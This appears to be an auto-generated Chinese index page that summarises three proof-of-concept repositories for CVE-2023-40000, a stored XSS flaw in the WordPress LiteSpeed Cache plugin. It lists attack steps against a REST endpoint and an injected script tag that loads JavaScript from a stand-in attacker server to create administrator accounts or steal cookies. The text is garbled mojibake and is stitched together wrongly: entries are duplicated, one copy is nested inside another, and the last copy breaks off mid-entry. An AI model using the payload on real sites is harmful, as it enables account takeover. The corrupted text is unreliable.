# CVE-2023-40000

> ğŸ“¦ è¯¥CVEæœ‰ **3** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-40000-iveresk_cve-2023-40000.md](../2023/CVE-2023-40000-iveresk_cve-2023-40000.md)

## CVE-2023-40000-LiteSpeed Cache-å­˜å‚¨å‹XSS

**æ¼æ´ç¼–å·:** CVE-2023-40000

**æ¼æ´ç±»å‹:** å­˜å‚¨å‹XSS

**å½±å“åº”ç”¨:** LiteSpeed Cache

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ç®¡ç†å‘˜è´¦å·è¢«ç›—ï¼Œæ¶æ„ä»£ç æ‰§è¡Œï¼Œç½‘ç«™å†…å®¹ç¯¡æ”¹ã€‚

**å½±å“ç‰ˆæœ¬:** <= 5.7

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç«™ç‚¹ä½¿ç”¨äº†LiteSpeed Cacheæ’ä»¶ï¼Œä¸”ç‰ˆæœ¬ä½äºæˆ–ç­‰äº5.7

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥æ¼æ´å­˜åœ¨äºLiteSpeed Cacheæ’ä»¶ä¸­ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„JavaScriptä»£ç ã€‚å½“ç®¡ç†å‘˜æˆ–è€…å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´ä¼šè¯åŠ«æŒã€cookieçªƒå–ã€æ¶æ„é‡å®šå‘ç”šè‡³ç®¡ç†å‘˜è´¦å·è¢«æ§åˆ¶ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…å‘é€ç²¾å¿ƒæ„é€ çš„POSTè¯·æ±‚åˆ°`/wp-json/litespeed/v1/cdn_status`ç«¯ç‚¹ï¼Œè¯·æ±‚ä¸­åŒ…å«æ¶æ„çš„XSS payloadã€‚
2.  **Payloadæ³¨å…¥:** è¯¥payloadä¼šè¢«å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶åœ¨ä¹‹åè¢«æ¸²æŸ“åˆ°é¡µé¢ä¸Šã€‚
3.  **XSSè§¦å‘:** å½“ç”¨æˆ·ï¼ˆä¾‹å¦‚ç®¡ç†å‘˜ï¼‰è®¿é—®åŒ…å«è¯¥æ¶æ„payloadçš„é¡µé¢æ—¶ï¼Œpayloadä¼šè¢«æ‰§è¡Œã€‚
4.  **æƒé™æå‡ï¼ˆPOCä¸­ï¼‰:** POCä»£ç å°è¯•åˆ©ç”¨XSSæ¼æ´åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦å·ã€‚å®ƒæ„é€ äº†åŒ…å«ç”¨æˆ·åã€é‚®ç®±å’Œå¯†ç çš„POSTè¯·æ±‚ï¼Œå¹¶åˆ©ç”¨WordPressçš„API `/wp-admin/user-new.php`æ¥åˆ›å»ºè´¦å·ã€‚è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬è·å–ä¸€ä¸ªnonceå€¼ï¼Œnonceæ˜¯WordPressç”¨æ¥é˜²æ­¢CSRFæ”»å‡»çš„å®‰å…¨ä»¤ç‰Œã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„POCä»£ç ï¼Œè¯¥æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œå‰ææ˜¯ç›®æ ‡ç«™ç‚¹æ»¡è¶³æ¼æ´åˆ©ç”¨çš„æ¡ä»¶ï¼ˆæ’ä»¶ç‰ˆæœ¬ä½äºç­‰äº5.7ï¼‰ã€‚è„šæœ¬çš„æ”»å‡»æ¨¡å¼ä½¿ç”¨POSTè¯·æ±‚å‘`/wp-json/litespeed/v1/cdn_status`å‘é€åŒ…å«payloadçš„æ•°æ®ï¼Œåˆ©ç”¨XSSæ¼æ´åˆ›å»ºç®¡ç†å‘˜è´¦å·ã€‚

**æŠ•æ¯’é£é™©åˆ†æ:**

æŸ¥çœ‹POCä»£ç ï¼Œæ”»å‡»è„šæœ¬ä¸»è¦åŒ…å«ä¸¤ä¸ªæ–‡ä»¶`README.md`å’Œ`check.sh`ï¼Œå…¶ä¸­`check.sh`æ˜¯åˆ©ç”¨è„šæœ¬ã€‚

*   `README.md`:  ä¸»è¦æè¿°äº†æ¼æ´å’Œä½¿ç”¨æ–¹æ³•ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç ã€‚
*   `check.sh`:  è„šæœ¬åŒ…å«checkå’Œattackä¸¤ç§æ¨¡å¼ã€‚Checkæ¨¡å¼ç”¨äºæ£€æµ‹ç›®æ ‡ç«™ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œattackæ¨¡å¼ç”¨äºæ‰§è¡Œæ¼æ´åˆ©ç”¨ã€‚æ¼æ´åˆ©ç”¨éƒ¨åˆ†åŒ…å«ä¸€ä¸ªXSS payloadï¼Œè¯¥payloadå°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦å·ã€‚

æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ç¼–ç æ··æ·†:** XSS payloadä½¿ç”¨äº†`String.fromCharCode`å‡½æ•°å¯¹JavaScriptä»£ç è¿›è¡Œç¼–ç ï¼Œè™½ç„¶ä¸æ˜¯ç‰¹åˆ«å¤æ‚çš„æ··æ·†ï¼Œä½†å¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨ç¼–ç åçš„å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ä»£ç ã€‚
2.  **evalå‡½æ•°ä½¿ç”¨:** ä½¿ç”¨`eval`å‡½æ•°æ‰§è¡Œpayloadå­˜åœ¨é£é™©ï¼Œå› ä¸ºevalå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ç†è®ºä¸Šï¼Œæ”»å‡»è€…å¯ä»¥åœ¨payloadä¸­æ’å…¥ä»»æ„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–å®‰è£…åé—¨ã€‚
3.  **ç¡¬ç¼–ç å‡­æ®:** POCä¸­åŒ…å«ç¡¬ç¼–ç çš„ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±åœ°å€ï¼Œè¿™äº›å‡­æ®å¯èƒ½è¢«æ”»å‡»è€…æ»¥ç”¨ã€‚

å°½ç®¡å­˜åœ¨ä¸Šè¿°é£é™©ï¼Œä½†ä»æ•´ä½“ä»£ç æ¥çœ‹ï¼Œè¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œæ¶æ„æŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œä»éœ€è¦å¯¹ä»£ç è¿›è¡Œä»”ç»†å®¡æŸ¥ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [iveresk/cve-2023-40000](https://github.com/iveresk/cve-2023-40000)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)

---

## POC #2

**æ¥æº**: [CVE-2023-40000-quantiom_litespeed-cache-xss-poc.md](../2023/CVE-2023-40000-quantiom_litespeed-cache-xss-poc.md)

# CVE-2023-40000

> ğŸ“¦ è¯¥CVEæœ‰ **3** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-40000-iveresk_cve-2023-40000.md](../2023/CVE-2023-40000-iveresk_cve-2023-40000.md)

## CVE-2023-40000-LiteSpeed Cache-å­˜å‚¨å‹XSS

**æ¼æ´ç¼–å·:** CVE-2023-40000

**æ¼æ´ç±»å‹:** å­˜å‚¨å‹XSS

**å½±å“åº”ç”¨:** LiteSpeed Cache

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ç®¡ç†å‘˜è´¦å·è¢«ç›—ï¼Œæ¶æ„ä»£ç æ‰§è¡Œï¼Œç½‘ç«™å†…å®¹ç¯¡æ”¹ã€‚

**å½±å“ç‰ˆæœ¬:** <= 5.7

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç«™ç‚¹ä½¿ç”¨äº†LiteSpeed Cacheæ’ä»¶ï¼Œä¸”ç‰ˆæœ¬ä½äºæˆ–ç­‰äº5.7

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥æ¼æ´å­˜åœ¨äºLiteSpeed Cacheæ’ä»¶ä¸­ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„JavaScriptä»£ç ã€‚å½“ç®¡ç†å‘˜æˆ–è€…å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´ä¼šè¯åŠ«æŒã€cookieçªƒå–ã€æ¶æ„é‡å®šå‘ç”šè‡³ç®¡ç†å‘˜è´¦å·è¢«æ§åˆ¶ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…å‘é€ç²¾å¿ƒæ„é€ çš„POSTè¯·æ±‚åˆ°`/wp-json/litespeed/v1/cdn_status`ç«¯ç‚¹ï¼Œè¯·æ±‚ä¸­åŒ…å«æ¶æ„çš„XSS payloadã€‚
2.  **Payloadæ³¨å…¥:** è¯¥payloadä¼šè¢«å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶åœ¨ä¹‹åè¢«æ¸²æŸ“åˆ°é¡µé¢ä¸Šã€‚
3.  **XSSè§¦å‘:** å½“ç”¨æˆ·ï¼ˆä¾‹å¦‚ç®¡ç†å‘˜ï¼‰è®¿é—®åŒ…å«è¯¥æ¶æ„payloadçš„é¡µé¢æ—¶ï¼Œpayloadä¼šè¢«æ‰§è¡Œã€‚
4.  **æƒé™æå‡ï¼ˆPOCä¸­ï¼‰:** POCä»£ç å°è¯•åˆ©ç”¨XSSæ¼æ´åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦å·ã€‚å®ƒæ„é€ äº†åŒ…å«ç”¨æˆ·åã€é‚®ç®±å’Œå¯†ç çš„POSTè¯·æ±‚ï¼Œå¹¶åˆ©ç”¨WordPressçš„API `/wp-admin/user-new.php`æ¥åˆ›å»ºè´¦å·ã€‚è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬è·å–ä¸€ä¸ªnonceå€¼ï¼Œnonceæ˜¯WordPressç”¨æ¥é˜²æ­¢CSRFæ”»å‡»çš„å®‰å…¨ä»¤ç‰Œã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„POCä»£ç ï¼Œè¯¥æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œå‰ææ˜¯ç›®æ ‡ç«™ç‚¹æ»¡è¶³æ¼æ´åˆ©ç”¨çš„æ¡ä»¶ï¼ˆæ’ä»¶ç‰ˆæœ¬ä½äºç­‰äº5.7ï¼‰ã€‚è„šæœ¬çš„æ”»å‡»æ¨¡å¼ä½¿ç”¨POSTè¯·æ±‚å‘`/wp-json/litespeed/v1/cdn_status`å‘é€åŒ…å«payloadçš„æ•°æ®ï¼Œåˆ©ç”¨XSSæ¼æ´åˆ›å»ºç®¡ç†å‘˜è´¦å·ã€‚

**æŠ•æ¯’é£é™©åˆ†æ:**

æŸ¥çœ‹POCä»£ç ï¼Œæ”»å‡»è„šæœ¬ä¸»è¦åŒ…å«ä¸¤ä¸ªæ–‡ä»¶`README.md`å’Œ`check.sh`ï¼Œå…¶ä¸­`check.sh`æ˜¯åˆ©ç”¨è„šæœ¬ã€‚

*   `README.md`:  ä¸»è¦æè¿°äº†æ¼æ´å’Œä½¿ç”¨æ–¹æ³•ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç ã€‚
*   `check.sh`:  è„šæœ¬åŒ…å«checkå’Œattackä¸¤ç§æ¨¡å¼ã€‚Checkæ¨¡å¼ç”¨äºæ£€æµ‹ç›®æ ‡ç«™ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œattackæ¨¡å¼ç”¨äºæ‰§è¡Œæ¼æ´åˆ©ç”¨ã€‚æ¼æ´åˆ©ç”¨éƒ¨åˆ†åŒ…å«ä¸€ä¸ªXSS payloadï¼Œè¯¥payloadå°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦å·ã€‚

æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ç¼–ç æ··æ·†:** XSS payloadä½¿ç”¨äº†`String.fromCharCode`å‡½æ•°å¯¹JavaScriptä»£ç è¿›è¡Œç¼–ç ï¼Œè™½ç„¶ä¸æ˜¯ç‰¹åˆ«å¤æ‚çš„æ··æ·†ï¼Œä½†å¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨ç¼–ç åçš„å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ä»£ç ã€‚
2.  **evalå‡½æ•°ä½¿ç”¨:** ä½¿ç”¨`eval`å‡½æ•°æ‰§è¡Œpayloadå­˜åœ¨é£é™©ï¼Œå› ä¸ºevalå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ç†è®ºä¸Šï¼Œæ”»å‡»è€…å¯ä»¥åœ¨payloadä¸­æ’å…¥ä»»æ„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–å®‰è£…åé—¨ã€‚
3.  **ç¡¬ç¼–ç å‡­æ®:** POCä¸­åŒ…å«ç¡¬ç¼–ç çš„ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±åœ°å€ï¼Œè¿™äº›å‡­æ®å¯èƒ½è¢«æ”»å‡»è€…æ»¥ç”¨ã€‚

å°½ç®¡å­˜åœ¨ä¸Šè¿°é£é™©ï¼Œä½†ä»æ•´ä½“ä»£ç æ¥çœ‹ï¼Œè¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œæ¶æ„æŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œä»éœ€è¦å¯¹ä»£ç è¿›è¡Œä»”ç»†å®¡æŸ¥ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [iveresk/cve-2023-40000](https://github.com/iveresk/cve-2023-40000)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)

---

## POC #2

**æ¥æº**: [CVE-2023-40000-quantiom_litespeed-cache-xss-poc.md](../2023/CVE-2023-40000-quantiom_litespeed-cache-xss-poc.md)

## CVE-2023-40000-LiteSpeed Cache-Stored XSS

**æ¼æ´ç¼–å·:** CVE-2023-40000

**æ¼æ´ç±»å‹:** Stored XSS

**å½±å“åº”ç”¨:** LiteSpeed Cache

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** <= 5.7

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç½‘ç«™å®‰è£…äº†LiteSpeed Cacheæ’ä»¶ä¸”ç‰ˆæœ¬ä½äºæˆ–ç­‰äº5.7ï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯åˆ©ç”¨

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥æ¼æ´å­˜åœ¨äºLiteSpeed Cacheæ’ä»¶çš„`update_cdn_status`å‡½æ•°ä¸­ã€‚ç”±äºè¯¥å‡½æ•°æœªå¯¹è¾“å…¥è¿›è¡Œå……åˆ†çš„è¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€åŒ…å«æ¶æ„JavaScriptä»£ç çš„POSTè¯·æ±‚ï¼Œå°†XSS payloadå­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“ç®¡ç†å‘˜è®¿é—®WordPressåå°æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ç­‰æ”»å‡»ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒé€šè¿‡æ¨¡æ‹Ÿå‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„POSTè¯·æ±‚ï¼Œåˆ©ç”¨`update_cdn_status`å‡½æ•°ä¸­çš„æ¼æ´ï¼Œå®ç°å­˜å‚¨å‹XSSã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoCä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼ˆ10%ï¼‰ã€‚PoCçš„ä¸»è¦åŠŸèƒ½æ˜¯æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œä½†æ¶æ„ä½œè€…å¯èƒ½ä¼šåœ¨PoCä¸­æ·»åŠ é¢å¤–çš„ä»£ç ï¼Œä¾‹å¦‚æ”¶é›†ç”¨æˆ·ä¿¡æ¯ã€æ¤å…¥åé—¨ç­‰ã€‚ä»£ç çš„readmeéƒ¨åˆ†ä»¥åŠlicenseæ˜¯æ¯”è¾ƒæ ‡å‡†çš„, åªæ˜¯å•çº¯çš„demo. ä½†ä»éœ€è¦å®¡æŸ¥ `admin-bar-reloaded.min.js` ä¸­çš„jsä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„POSTè¯·æ±‚ã€‚
2.  å°†`success`å‚æ•°è®¾ç½®ä¸º`0`ï¼Œ`result[_msg]`å‚æ•°è®¾ç½®ä¸ºåŒ…å«`<script src=https://your.server/admin-bar-reloaded.min.js></script>`çš„payloadï¼Œå…¶ä¸­`https://your.server/admin-bar-reloaded.min.js`æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šçš„æ¶æ„è„šæœ¬ã€‚
3.  é€šè¿‡cURLç­‰å·¥å…·å°†POSTè¯·æ±‚å‘é€åˆ°ç›®æ ‡ç½‘ç«™çš„`/wp-json/litespeed/v1/cdn_status`ç«¯ç‚¹ã€‚
4.  å½“ç®¡ç†å‘˜è®¿é—®WordPressåå°æ—¶ï¼Œå­˜å‚¨çš„XSS payloadä¼šè¢«è§¦å‘ï¼Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„ä»£ç å¯ä»¥åˆ›å»ºæ–°çš„ç®¡ç†å‘˜è´¦å·ï¼Œæˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–Cookieã€ä¿®æ”¹ç½‘ç«™å†…å®¹ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [quantiom/litespeed-cache-xss-poc](https://github.com/quantiom/litespeed-cache-xss-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)

---

## POC #3

**æ¥æº**: [CVE-2023-40000-rxerium_CVE-2023-40000.md](../2023/CVE-2023-40000-rxerium_CVE-2023-40000.md)

## CVE-2023-40000 - WordPress LiteSpeed Cache å­˜å‚¨å‹XSSæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2023-40000

**æ¼æ´ç±»å‹:** å­˜å‚¨å‹XSS (Stored XSS)

**å½±å“åº”ç”¨:** LiteSpeed Cache

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡å’Œç½‘ç«™æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** <= 5.7

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ï¼ŒCVE-2023-40000æ˜¯LiteSpeed Cacheæ’ä»¶5.7åŠæ›´æ—©ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªå­˜å‚¨å‹XSSæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„JavaScriptä»£ç æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œå½“ç®¡ç†å‘˜æˆ–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œä»£ç å°†åœ¨å…¶æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä¼šè¯åŠ«æŒã€æƒé™æå‡æˆ–ç½‘ç«™æ§åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„Nucleiæ¨¡æ¿æ—¨åœ¨é€šè¿‡æ£€æŸ¥`/wp-content/plugins/litespeed-cache/readme.txt`æ–‡ä»¶çš„`Stable Tag`æ¥æ£€æµ‹æ˜“å—æ”»å‡»çš„LiteSpeed Cacheæ’ä»¶ç‰ˆæœ¬ã€‚å¦‚æœæ£€æµ‹åˆ°çš„ç‰ˆæœ¬ä½äº5.7.0.1ï¼Œåˆ™è¯¥æ’ä»¶è¢«è®¤ä¸ºæ˜¯æ˜“å—æ”»å‡»çš„ã€‚è¿™ä¸ªæ–¹æ³•ç›¸å¯¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒç›´æ¥æ£€æŸ¥äº†æ’ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ¼æ´åˆ©ç”¨ä»£ç é€šè¿‡ç‰ˆæœ¬åˆ¤æ–­æ¥ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå…·æœ‰ä¸€å®šçš„å‡†ç¡®æ€§ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

Nucleiæ¨¡æ¿æœ¬èº«ä¸»è¦ç”¨äºæ¼æ´æ£€æµ‹ï¼Œé£é™©ç›¸å¯¹è¾ƒå°ã€‚LICENSEæ–‡ä»¶å£°æ˜æ˜¯MIT Licenseï¼Œçœ‹èµ·æ¥æ²¡æœ‰æ¶æ„ï¼ŒREADMEæ–‡ä»¶ä»…æè¿°äº†å¦‚ä½•ä½¿ç”¨è¯¥æ¨¡æ¿ã€‚

å¯èƒ½çš„é£é™©ç‚¹åœ¨äºï¼š

1.  **æ¨¡æ¿é€»è¾‘é”™è¯¯ï¼š** è™½ç„¶æ£€æµ‹é€»è¾‘ç®€å•ï¼Œä½†å¦‚æœæ¨¡æ¿ç¼–å†™å­˜åœ¨é”™è¯¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¯¯æŠ¥æˆ–æ¼æŠ¥ã€‚ä¾‹å¦‚ï¼ŒregexåŒ¹é…é”™è¯¯æˆ–è€…compare_versionså‡½æ•°çš„bugã€‚
2.  **ä¾èµ–Nucleiæœ¬èº«ï¼š** æ¨¡æ¿ä¾èµ–Nucleiè¿è¡Œï¼Œå¦‚æœNucleiç¨‹åºæœ¬èº«å­˜åœ¨æ¼æ´ï¼Œå¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚

æ€»ä½“è¯„ä¼°ï¼Œè¯¥POCæœ¬èº«ç›´æ¥æŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ä¸å½“æˆ–è€…è¯¯æŠ¥çš„é£é™©ã€‚æŠ•æ¯’é£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´æ£€æµ‹ï¼š** ä½¿ç”¨Nucleiç­‰å·¥å…·åŠ è½½æä¾›çš„YAMLæ¨¡æ¿ï¼Œæ‰«æç›®æ ‡WordPressç«™ç‚¹ã€‚
2.  **ç‰ˆæœ¬åˆ¤æ–­ï¼š** æ¨¡æ¿ä¼šè¯»å–`/wp-content/plugins/litespeed-cache/readme.txt`æ–‡ä»¶ï¼Œå¹¶æå–æ’ä»¶ç‰ˆæœ¬ä¿¡æ¯ã€‚
3.  **æ¼æ´ç¡®è®¤ï¼š** å¦‚æœæ£€æµ‹åˆ°çš„ç‰ˆæœ¬ä½äº5.7.0.1ï¼Œåˆ™è¡¨æ˜è¯¥ç«™ç‚¹å¯èƒ½å­˜åœ¨CVE-2023-40000æ¼æ´ã€‚
4.  **æ”»å‡»å®æ–½ï¼š**ç”±äºæ˜¯å­˜å‚¨å‹XSSï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šæ–¹å¼ï¼ˆå…·ä½“æ³¨å…¥ç‚¹éœ€è¦è¿›ä¸€æ­¥åˆ†æï¼‰ï¼Œå°†æ¶æ„JavaScriptä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«è¯¥æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼ŒXSSæ¼æ´å°†è¢«è§¦å‘ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°†LiteSpeed Cacheæ’ä»¶æ›´æ–°åˆ°5.7.0.1æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚
*   å®æ–½ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç ï¼Œé˜²æ­¢XSSæ”»å‡»ã€‚

**é¡¹ç›®åœ°å€:** [rxerium/CVE-2023-40000](https://github.com/rxerium/CVE-2023-40000)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)

---



---

## POC #3

**æ¥æº**: [CVE-2023-40000-rxerium_CVE-2023-40000.md](../2023/CVE-2023-40000-rxerium_CVE-2023-40000.md)

## CVE-2023-40000 - WordPress LiteSpeed Cache å­˜å‚¨å‹XSSæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2023-40000

**æ¼æ´ç±»å‹:** å­˜å‚¨å‹XSS (Stored XSS)

**å½±å“åº”ç”¨:** LiteSpeed Cache

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡å’Œç½‘ç«™æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** <= 5.7

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ï¼ŒCVE-2023-40000æ˜¯LiteSpeed Cacheæ’ä»¶5.7åŠæ›´æ—©ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªå­˜å‚¨å‹XSSæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„JavaScriptä»£ç æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œå½“ç®¡ç†å‘˜æˆ–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œä»£ç å°†åœ¨å…¶æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä¼šè¯åŠ«æŒã€æƒé™æå‡æˆ–ç½‘ç«™æ§åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

